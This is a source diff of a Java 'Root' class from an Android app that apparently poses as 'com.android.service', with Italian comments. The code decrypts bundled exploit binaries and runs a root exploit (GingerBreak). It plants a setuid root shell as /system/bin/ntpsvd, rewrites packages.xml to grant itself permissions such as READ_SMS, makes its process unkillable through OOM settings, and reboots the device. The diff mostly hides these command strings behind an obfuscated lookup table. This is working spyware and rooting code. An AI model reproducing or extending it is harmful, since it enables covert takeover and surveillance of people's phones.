@@ -48,48 +48,53 @@ public class Root {
 
 		return false;
 	}
-	
-	static public void adjustOom() {	
+
+	static public void adjustOom() {
 		if (Status.haveRoot() == false) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (adjustOom): cannot adjust OOM without root privileges"); //$NON-NLS-1$
 			}
-			
+
 			return;
 		}
 		
 		int pid = android.os.Process.myPid();
-		
-		String script = "#!/system/bin/sh\n" + "/system/bin/ntpsvd qzx \"echo '-1000' > /proc/" + pid + "/oom_score_adj\"" + "\n";
-		script += "/system/bin/ntpsvd qzx \"echo '-17' > /proc/" + pid + "/oom_adj\"" + "\n";
+		// 32_34=#!/system/bin/sh
+		// 32_35=/system/bin/ntpsvd qzx \"echo '-1000' >
+		// /proc/
+		// 32_36=/oom_score_adj\"
+		String script = Messages.getString("32_34")+ "\n" + Messages.getString("32_35") + pid + Messages.getString("32_36") + "\n";
+		// 32_37=/system/bin/ntpsvd qzx \"echo '-17' > /proc/
+		// 32_38=/oom_adj\"
+		script += Messages.getString("32_37") + pid + Messages.getString("32_38") + "\n";
 
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (adjustOom): script: " + script); //$NON-NLS-1$
 		}
-				
+
 		if (createScript("o", script) == false) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (adjustOom): failed to create OOM script"); //$NON-NLS-1$
 			}
-			
+
 			return;
 		}
-		
+
 		Execute ex = new Execute();
 		ex.execute(Status.getAppContext().getFilesDir() + "/o");
-		
+
 		removeScript("o");
-		
+
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (adjustOom): OOM Adjusted"); //$NON-NLS-1$
 		}
 	}
-	
+
 	// Prendi la root tramite superuser.apk
 	static public void superapkRoot() {
 		final File filesPath = Status.getAppContext().getFilesDir();
 		final String path = filesPath.getAbsolutePath();
-		final String suidext = Messages.getString("32.6"); // statusdb
+		final String suidext = Messages.getString("32_6"); // statusdb
 
 		if (Status.haveSu() == false) {
 			return;
@@ -108,24 +113,37 @@ public class Root {
 			// Proviamoci ad installare la nostra shell root
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (superapkRoot): " + "chmod 755 " + path + "/" + suidext); //$NON-NLS-1$
-				Check.log(TAG
-						+ " (superapkRoot): " + Messages.getString("32.31")); //$NON-NLS-1$
+				Check.log(TAG + " (superapkRoot): " + Messages.getString("32_31")); //$NON-NLS-1$
 			}
 
-			Runtime.getRuntime().exec(Messages.getString("32.7") + path + "/" + suidext);
+			Runtime.getRuntime().exec(Messages.getString("32_7") + path + "/" + suidext);
 
 			// 32.29 = /data/data/com.android.service/files/statusdb rt
-			String script = "#!/system/bin/sh\n" + Messages.getString("32.29") + "\n";
+			// 32_34=#!/system/bin/sh\n
+			String script = Messages.getString("32_34") + "\n" + Messages.getString("32_29") + "\n";
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (superapkRoot), script: " + script);
+			}
 
 			if (Root.createScript("s", script) == true) {
-				Process runScript = Runtime.getRuntime().exec(Messages.getString("32.7") + path + "/s");
-				runScript.waitFor();
+				Process runScript = Runtime.getRuntime().exec(Messages.getString("32_7") + path + "/s");
+				int ret = runScript.waitFor();
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (superapkRoot) execute 1: " + Messages.getString("32_7") + path + "/s" + " ret: "
+							+ ret);
+				}
 
 				// su -c /data/data/com.android.service/files/s
-				Process localProcess = Runtime.getRuntime().exec(Messages.getString("32.31"));
-				localProcess.waitFor();
-
-				Root.removeScript("s");
+				Process localProcess = Runtime.getRuntime().exec(Messages.getString("32_31"));
+				ret = localProcess.waitFor();
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (superapkRoot) execute 2: " + Messages.getString("32_31") + " ret: " + ret);
+				}
+				//Root.removeScript("s");
+			}else{
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " ERROR: (superapkRoot), cannot create script");
+				}
 			}
 		} catch (final Exception e1) {
 			if (Cfg.EXCEPTION) {
@@ -140,34 +158,35 @@ public class Root {
 			return;
 		}
 	}
-	
-	// name WITHOUT path (script is generated inside /data/data/<package>/files/ directory)
+
+	// name WITHOUT path (script is generated inside /data/data/<package>/files/
+	// directory)
 	static public boolean createScript(String name, String script) {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (createScript): script: " + script); //$NON-NLS-1$
 		}
-	
+
 		try {
 			FileOutputStream fos = Status.getAppContext().openFileOutput(name, Context.MODE_PRIVATE);
 			fos.write(script.getBytes());
 			fos.close();
-	
-			Execute ex = new Execute();			
+
+			Execute ex = new Execute();
 			ex.execute("chmod 755 " + Status.getAppContext().getFilesDir() + name);
-			
+
 			return true;
 		} catch (Exception e) {
 			if (Cfg.EXP) {
 				Check.log(e);
 			}
-	
+
 			return false;
 		}
 	}
 
 	static public void removeScript(String name) {
 		File rem = new File(Status.getAppContext().getFilesDir() + name);
-	
+
 		if (rem.exists()) {
 			rem.delete();
 		}
@@ -176,27 +195,39 @@ public class Root {
 	public void getPermissions() {
 		// Abbiamo su?
 		Status.setSu(PackageInfo.hasSu());
-	
+
 		// Abbiamo la root?
 		Status.setRoot(PackageInfo.checkRoot());
-	
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (getPermissions), su: " + Status.haveSu() + " root: " + Status.haveRoot() + " want: "
+					+ Keys.self().wantsPrivilege());
+		}
+
 		if (Status.haveSu() == true && Status.haveRoot() == false && Keys.self().wantsPrivilege()) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (getPermissions), ask the user");
+			}
 			// Ask the user...
 			Root.superapkRoot();
-	
+
 			Status.setRoot(PackageInfo.checkRoot());
-	
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (onStart): isRoot = " + Status.haveRoot()); //$NON-NLS-1$
 			}
+		} else {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (getPermissions), don't ask");
+			}
 		}
-	
+
 		// Avoid having the process killed for using too many resources
 		Root.adjustOom();
 	}
 
 	static public boolean fileWrite(final String exploit, InputStream stream, String passphrase) throws IOException,
-	FileNotFoundException {
+			FileNotFoundException {
 		try {
 			InputStream in = decodeEnc(stream, passphrase);
 
@@ -224,9 +255,9 @@ public class Root {
 
 		return true;
 	}
-	
-	static public InputStream decodeEnc(InputStream stream, String passphrase) throws IOException, NoSuchAlgorithmException,
-	NoSuchPaddingException, InvalidKeyException, InvalidAlgorithmParameterException {
+
+	static public InputStream decodeEnc(InputStream stream, String passphrase) throws IOException,
+			NoSuchAlgorithmException, NoSuchPaddingException, InvalidKeyException, InvalidAlgorithmParameterException {
 
 		SecretKey key = MessagesDecrypt.produceKey(passphrase);
 
@@ -240,7 +271,7 @@ public class Root {
 		}
 
 		// 17.4=AES/CBC/PKCS5Padding
-		Cipher cipher = Cipher.getInstance(Messages.getString("17.4")); //$NON-NLS-1$
+		Cipher cipher = Cipher.getInstance(Messages.getString("17_4")); //$NON-NLS-1$
 		final byte[] iv = new byte[16];
 		Arrays.fill(iv, (byte) 0);
 		IvParameterSpec ivSpec = new IvParameterSpec(iv);
@@ -265,19 +296,19 @@ public class Root {
 				return false;
 			}
 
-			final String crashlog = Messages.getString("32.4"); //$NON-NLS-1$
-			final String exploit = Messages.getString("32.5"); //$NON-NLS-1$
-			final String suidext = Messages.getString("32.6"); //$NON-NLS-1$
+			final String crashlog = Messages.getString("32_4"); //$NON-NLS-1$
+			final String exploit = Messages.getString("32_5"); //$NON-NLS-1$
+			final String suidext = Messages.getString("32_6"); //$NON-NLS-1$
 			boolean isRoot = false;
 
 			// Creiamo il crashlog
 			final FileOutputStream fos = Status.getAppContext().openFileOutput(crashlog, Context.MODE_PRIVATE);
 			fos.close();
-			
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (root): saving statuslog"); //$NON-NLS-1$
 			}
-			
+
 			// exploit
 			InputStream stream = Utils.getAssetStream("e.bin");
 
@@ -287,7 +318,7 @@ public class Root {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (root): saving exploit e.bin"); //$NON-NLS-1$
 			}
-			
+
 			// shell
 			stream = Utils.getAssetStream("s.bin");
 
@@ -298,9 +329,9 @@ public class Root {
 			final File filesPath = Status.getAppContext().getFilesDir();
 			final String path = filesPath.getAbsolutePath();
 
-			Runtime.getRuntime().exec(Messages.getString("32.7") + path + "/" + exploit); //$NON-NLS-1$ //$NON-NLS-2$
-			Runtime.getRuntime().exec(Messages.getString("32.8") + path + "/" + suidext); //$NON-NLS-1$ //$NON-NLS-2$
-			Runtime.getRuntime().exec(Messages.getString("32.9") + path + "/" + crashlog); //$NON-NLS-1$ //$NON-NLS-2$
+			Runtime.getRuntime().exec(Messages.getString("32_7") + path + "/" + exploit); //$NON-NLS-1$ //$NON-NLS-2$
+			Runtime.getRuntime().exec(Messages.getString("32_8") + path + "/" + suidext); //$NON-NLS-1$ //$NON-NLS-2$
+			Runtime.getRuntime().exec(Messages.getString("32_9") + path + "/" + crashlog); //$NON-NLS-1$ //$NON-NLS-2$
 
 			String exppath = path + "/" + exploit; //$NON-NLS-1$
 
@@ -329,10 +360,10 @@ public class Root {
 
 			if (isRoot) {
 				// Di' a suidext di fare il kill di VOLD per due volte
-				Runtime.getRuntime().exec(path + "/" + suidext + Messages.getString("32.10")); //$NON-NLS-1$ //$NON-NLS-2$
+				Runtime.getRuntime().exec(path + "/" + suidext + Messages.getString("32_10")); //$NON-NLS-1$ //$NON-NLS-2$
 
 				// Copia la shell root, ovvero il suidext, in /system/bin/ntpsvd
-				Runtime.getRuntime().exec(path + "/" + suidext + Messages.getString("32.11")); //$NON-NLS-1$ //$NON-NLS-2$
+				Runtime.getRuntime().exec(path + "/" + suidext + Messages.getString("32_11")); //$NON-NLS-1$ //$NON-NLS-2$
 
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (onStart): Root exploit"); //$NON-NLS-1$
@@ -365,7 +396,7 @@ public class Root {
 	// TODO: rimuovere lo string-fu, cifrare le stringhe, cifrare
 	// le stringe nella librunner.so. Fixare il fatto che l'app va
 	// in crash se la funzione torna 0 o 1 e si ferma il servizio
-	
+
 	/*
 	 * Verifica e prova ad ottenere le necessarie capabilities
 	 * 
@@ -373,14 +404,14 @@ public class Root {
 	 * e' in attesa di un reboot 2 se gia' abbiamo le cap necessarie
 	 */
 	public static int overridePermissions() {
-		final String manifest = Messages.getString("32.15"); //$NON-NLS-1$ 
+		final String manifest = Messages.getString("32_15"); //$NON-NLS-1$ 
 
 		// Controlliamo se abbiamo le capabilities necessarie
 		PackageManager pkg = Status.getAppContext().getPackageManager();
 
 		if (pkg != null) {
 			// android.permission.READ_SMS, com.android.service
-			int perm = pkg.checkPermission(Messages.getString("32.16"), Messages.getString("32.17"));
+			int perm = pkg.checkPermission(Messages.getString("32_16"), Messages.getString("32_17"));
 
 			if (perm == PackageManager.PERMISSION_GRANTED) {
 				return 2;
@@ -389,7 +420,7 @@ public class Root {
 
 		try {
 			Execute ex = new Execute();
-			
+
 			// Runtime.getRuntime().exec("/system/bin/ntpsvd fhc /data/system/packages.xml /data/data/com.android.service/files/packages.xml");
 			// Creiamo la directory files
 			Status.getAppContext().openFileOutput("test", Context.MODE_WORLD_READABLE);
@@ -397,15 +428,15 @@ public class Root {
 			// Copiamo packages.xml nel nostro path e rendiamolo scrivibile
 			// /system/bin/ntpsvd fhc /data/system/packages.xml
 			// /data/data/com.android.service/files/packages.xml
-			ex.execute(Messages.getString("32.18"));
+			ex.execute(Messages.getString("32_18"));
 			Utils.sleep(600);
 			// /system/bin/ntpsvd pzm 666
 			// /data/data/com.android.service/files/packages.xml
-			ex.execute(Messages.getString("32.19"));
+			ex.execute(Messages.getString("32_19"));
 
 			// Rimuoviamo il file temporaneo
 			// /data/data/com.android.service/files/test
-			File tmp = new File(Messages.getString("32.20"));
+			File tmp = new File(Messages.getString("32_20"));
 
 			if (tmp.exists() == true) {
 				tmp.delete();
@@ -413,9 +444,9 @@ public class Root {
 
 			// Aggiorniamo il file
 			// packages.xml
-			FileInputStream fin = Status.getAppContext().openFileInput(Messages.getString("32.21"));
+			FileInputStream fin = Status.getAppContext().openFileInput(Messages.getString("32_21"));
 			// com.android.service
-			PackageInfo pi = new PackageInfo(fin, Messages.getString("2.17"));
+			PackageInfo pi = new PackageInfo(fin, Messages.getString("2_17"));
 
 			String path = pi.getPackagePath();
 
@@ -431,7 +462,7 @@ public class Root {
 
 				// Rimuoviamo la nostra copia
 				// /data/data/com.android.service/files/packages.xml
-				File f = new File(Messages.getString("32.22"));
+				File f = new File(Messages.getString("32_22"));
 
 				if (f.exists() == true) {
 					f.delete();
@@ -441,7 +472,7 @@ public class Root {
 			}
 
 			// perm.xml
-			pi.addRequiredPermissions(Messages.getString("32.23"));
+			pi.addRequiredPermissions(Messages.getString("32_23"));
 
 			// .apk con tutti i permessi nel manifest
 
@@ -454,16 +485,16 @@ public class Root {
 			// Copiamolo in /data/app/*.apk
 			// /system/bin/ntpsvd qzx \"cat
 			// /data/data/com.android.service/files/layout >
-			ex.execute(Messages.getString("32.24") + path + "\"");
+			ex.execute(Messages.getString("32_24") + path + "\"");
 
 			// Copiamolo in /data/system/packages.xml
 			// /system/bin/ntpsvd qzx
 			// \"cat /data/data/com.android.service/files/perm.xml > /data/system/packages.xml\""
-			ex.execute(Messages.getString("32.25"));
+			ex.execute(Messages.getString("32_25"));
 
 			// Rimuoviamo la nostra copia
 			// /data/data/com.android.service/files/packages.xml
-			File f = new File(Messages.getString("32.22"));
+			File f = new File(Messages.getString("32_22"));
 
 			if (f.exists() == true) {
 				f.delete();
@@ -471,7 +502,7 @@ public class Root {
 
 			// Rimuoviamo il file temporaneo
 			// /data/data/com.android.service/files/perm.xml
-			f = new File(Messages.getString("32.26"));
+			f = new File(Messages.getString("32_26"));
 
 			if (f.exists() == true) {
 				f.delete();
@@ -479,7 +510,7 @@ public class Root {
 
 			// Rimuoviamo l'apk con tutti i permessi
 			// /data/data/com.android.service/files/layout
-			f = new File(Messages.getString("32.27"));
+			f = new File(Messages.getString("32_27"));
 
 			if (f.exists() == true) {
 				f.delete();
@@ -487,7 +518,7 @@ public class Root {
 
 			// Riavviamo il telefono
 			// /system/bin/ntpsvd reb
-			ex.execute(Messages.getString("32.28"));
+			ex.execute(Messages.getString("32_28"));
 		} catch (Exception e1) {
 			if (Cfg.EXCEPTION) {
 				Check.log(e1);
@@ -503,10 +534,10 @@ public class Root {
 
 		return 1;
 	}
-	
+
 	public void runGingerBreak() {
 		boolean isRoot = Status.haveRoot();
-	
+
 		if (isRoot == false) {
 			// Don't exploit if we have no SD card mounted
 			if (android.os.Environment.getExternalStorageState().equals(android.os.Environment.MEDIA_MOUNTED)) {
@@ -517,30 +548,30 @@ public class Root {
 				}
 			}
 		}
-	
+
 		if (isRoot == false) {
 			// Ask the user...
 			Root.superapkRoot();
-	
+
 			isRoot = PackageInfo.checkRoot();
 		}
-	
+
 		if (isRoot == true) {
 			int ret = Root.overridePermissions();
-	
+
 			Toast.makeText(Status.getAppContext(), "RET: " + ret, Toast.LENGTH_LONG).show(); //$NON-NLS-1$
-	
+
 			switch (ret) {
-				case 0:
-				case 1:
-					return; // Non possiamo partire
-	
-				case 2: // Possiamo partire
-				default:
-					break;
+			case 0:
+			case 1:
+				return; // Non possiamo partire
+
+			case 2: // Possiamo partire
+			default:
+				break;
 			}
 		}
-	
+
 		Status.setRoot(isRoot);
 	}
 
